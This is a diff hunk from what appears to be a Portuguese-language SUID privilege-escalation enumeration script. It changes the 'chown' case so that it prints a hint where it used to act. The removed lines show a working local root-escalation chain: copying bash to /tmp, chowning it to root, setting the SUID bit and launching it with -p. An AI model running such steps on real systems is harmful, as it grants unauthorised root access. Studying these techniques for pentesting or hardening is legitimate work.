@@ -144,10 +144,8 @@ for path in $SUIDS; do
             ;;
         chown)
             echo "[+] $path → chown SUID encontrado! Teste:"
-            cp /bin/bash /tmp/sh
-            "$path" root:root /tmp/sh
-            chmod +s /tmp/sh
-            /tmp/sh -p
+            echo "LFILE=file_to_change"
+            echo ""$path" $(id -un):$(id -gn) $LFILE"
             ;;
         choom)
             echo "[+] $path → choom SUID encontrado! Teste:"
